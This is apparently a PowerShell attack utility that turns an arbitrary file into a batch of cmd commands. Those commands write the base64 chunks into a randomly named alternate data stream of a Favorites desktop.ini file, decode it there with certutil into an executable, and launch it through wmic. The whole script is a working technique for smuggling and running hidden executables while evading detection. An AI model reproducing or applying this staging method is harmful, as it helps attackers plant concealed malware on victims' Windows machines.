#Write-Host "Taking in file: $($args[0])"
$file = $args[0]
$payload = Get-Content -Path $file -Encoding Byte
$base64 = [System.Convert]::ToBase64String($payload)
$maximumCommandLength=1000
$payloadLength = $base64.length
$pieces = [Math]::Ceiling($payloadLength/$maximumCommandLength)
#Write-Host "Payload is $($payloadLength) bytes. Windows maximum cmd length is $($maximumCommandLength). Splitting into $($pieces) pieces."
$pnt=0
$result=""
while ($pnt -lt $pieces-1) {
	#Write-Host "Start payload $($pnt) : $($pnt*$maximumCommandLength) going in this deep: $(($pnt*$maximumCommandLength)+$maximumCommandLength)"
	$result += "set param$($pnt)=$($base64.substring(($pnt*$maximumCommandLength), $maximumCommandLength))"
	$result += "`r`n"
	#Write-Host $result
	$pnt++;
}
$remain = $payloadLength-($pnt*$maximumCommandLength)
$result += "set param$($pnt)=$($base64.substring(($pnt*$maximumCommandLength),$remain))"
$result += "`r`n"
$result += ""
$chars    = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
$random = ""
for ($x = 0; $x -lt 16; $x++) {
    $random += $chars | Get-Random
}
$oldPnt = $pnt
$pnt = 0
while ($pnt -le $oldPnt) {
$result += "echo|set /p=%param$($pnt)%>>%userprofile%\Favorites\desktop.ini:$($random)"
$result += "`r`n"
$pnt++;
}

$result += "certutil -decode %userprofile%\Favorites\desktop.ini:$($random) %userprofile%\Favorites\desktop.ini:$($random).exe"
$result += "`r`n"
#$result += "type %userprofile%\$($random).exe > %userprofile%\Favorites\desktop.ini:$($random).exe"
#$result += "`r`n"
$result += "wmic process call create `"%userprofile%\Favorites\desktop.ini:$($random).exe`""
Write-Host $result
#$result | Out-File "$($random).bat"